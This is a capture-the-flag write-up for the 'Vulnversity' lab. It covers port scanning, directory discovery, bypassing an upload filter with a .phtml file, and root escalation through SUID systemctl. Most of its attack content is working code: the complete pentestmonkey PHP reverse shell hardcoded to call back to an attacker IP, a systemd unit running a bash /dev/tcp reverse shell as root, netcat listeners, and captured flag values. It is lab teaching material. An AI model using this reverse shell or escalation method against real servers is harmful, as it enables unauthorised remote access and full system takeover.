---
description: 'Learn about active recon, web app attacks and privilege escalation.'
---

# Vulnversity

## Task \#1: Deploy the Machine and connect to VPN

```bash
sudo openvpn fer.opvn
```

## Task \#2: Reconnaisance

> Generated on **Mon Jul 19 07:27:50 2021** with `nmap 7.91`.

```bash
nmap -sV -n -v -Pn -p- -T4 -A --open -oX portScan.xml 10.10.32.135
```

### Open Ports and Running Services

| State | Service | Version |  |
| :--- | :--- | :--- | :--- |
| 21/tcp | open | ftp | vsftpd 3.0.3 |
| 22/tcp | open | ssh | OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 |
| 139/tcp | open | netbios-ssn | Samba smbd 3.X - 4.X |
| 445/tcp | open | netbios-ssn | Samba smbd 4.3.11-Ubuntu |
| 3128/tcp | open | http-proxy | Squid http proxy 3.5.12 |
| 3333/tcp | open | http | Apache httpd 2.4.18 |

## Task \#3: Locating directories in the webserver

{% hint style="success" %}
#### What is the directory that has an upload form page?

Dirbuster found the following route with an Upload form:

* [http://10.10.32.135:3333/internal/](http://10.10.32.135:3333/internal/)
{% endhint %}

{% tabs %}
{% tab title="OWASP Dirbuster 1.0-RC1 " %}
* Target URL: [http://10.10.32.135:3333/](http://10.10.32.135:3333/)
* File Extension: \*
* File with list of dirs/files: /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
{% endtab %}

{% tab title="Report" %}
```bash

```
{% endtab %}
{% endtabs %}

## Task \#4: Compromise the webserver

#### Try upload a few file types to the server, what common extension seems to be blocked?

{% tabs %}
{% tab title="Burpsuite Payload Positions" %}
![](../../.gitbook/assets/image%20%2817%29.png)
{% endtab %}

{% tab title="Payload Options" %}
![](../../.gitbook/assets/image%20%2819%29.png)
{% endtab %}

{% tab title="Grep - Extract" %}
![](../../.gitbook/assets/image%20%2818%29.png)
{% endtab %}

{% tab title="Intruder Attack" %}
![](../../.gitbook/assets/image%20%2816%29.png)
{% endtab %}
{% endtabs %}

{% hint style="success" %}
**Burpsuite showed** `.phtml` **files are allowed to upload.** 

Let's upload a PHP rev-shell to **find our flag!**
{% endhint %}

{% tabs %}
{% tab title="rev-shell.phtml" %}
```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.9.8.228';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 
```
{% endtab %}

{% tab title="Netcat listener" %}
```bash
nc -lvnp 1234
```
{% endtab %}

{% tab title="Web Server Manager" %}
```
$ ls -la /home
total 12
drwxr-xr-x  3 root root 4096 Jul 31  2019 .
drwxr-xr-x 23 root root 4096 Jul 31  2019 ..
drwxr-xr-x  2 bill bill 4096 Jul 31  2019 bill

```
{% endtab %}

{% tab title="User Flag" %}
```
$ cat /home/bill/user.txt
8bd7992fbe8a6ad22a63361004cfcedb
```
{% endtab %}
{% endtabs %}

## Task \#5: Privilege Escalation

{% tabs %}
{% tab title="Find Files with SUID Set" %}
```text
$ cd /
$ find . -perm /4000 -print 2>/dev/null
./usr/bin/newuidmap
./usr/bin/chfn
./usr/bin/newgidmap
./usr/bin/sudo
./usr/bin/chsh
./usr/bin/passwd
./usr/bin/pkexec
./usr/bin/newgrp
./usr/bin/gpasswd
./usr/bin/at
./usr/lib/snapd/snap-confine
./usr/lib/policykit-1/polkit-agent-helper-1
./usr/lib/openssh/ssh-keysign
./usr/lib/eject/dmcrypt-get-device
./usr/lib/squid/pinger
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
./bin/su
./bin/ntfs-3g
./bin/mount
./bin/ping6
./bin/umount
./bin/systemctl
./bin/ping
./bin/fusermount
./sbin/mount.cifs
```
{% endtab %}

{% tab title="Payload for /bin/systemctl \(root.service\)" %}
```
[Unit]
Description=roooooooooot

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.9.8.228/9999 0>&1'

[Install]
WantedBy=multi-user.target
```
{% endtab %}

{% tab title="Nc local listener" %}
```
nc -lvnp 9999
```
{% endtab %}

{% tab title="Execute" %}
```
$ /bin/systemctl enable /var/tmp/root.service
Created symlink from /etc/systemd/system/multi-user.target.wants/root.service to /var/tmp/root.service
Created symlink from /etc/systemd/system/root.service to /var/tmp/root.service

/bin/systemctl start root
```
{% endtab %}

{% tab title="Output" %}
```
root@vulnuniversity:~# cat root.txt
cat root.txt
a58ff8579f0a9270368d33a9966c7fd5

```
{% endtab %}
{% endtabs %}

## References

* [Privilege Escalation: Systemctl \(Misconfigured Permissions — sudo/SUID\)](https://gist.github.com/A1vinSmith/78786df7899a840ec43c5ddecb6a4740)

